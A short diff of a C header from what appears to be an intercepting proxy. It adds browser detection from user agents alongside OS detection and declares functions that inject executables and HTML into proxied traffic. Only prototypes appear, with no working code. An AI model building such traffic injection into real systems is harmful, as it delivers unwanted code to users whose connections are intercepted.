@@ -27,7 +27,8 @@
 /* protos */
 typedef enum osuser { WINDOWS = 0, OSX, LINUX, UNKNOWN } osuser;
 
-extern osuser search_useragent(char *request);
+extern osuser search_useragent_os(char *request);
+extern int search_useragent_browser(char *request);
 extern void proxy_start(void);
 extern int proxy_inject_exe(BIO **cbio, BIO **sbio, char *header, char *file, char *host, char *ip, char *url);
 extern int proxy_inject_html(BIO **cbio, BIO **sbio, char *header, char *file, char *tag, char *host, char *ip, char *url);
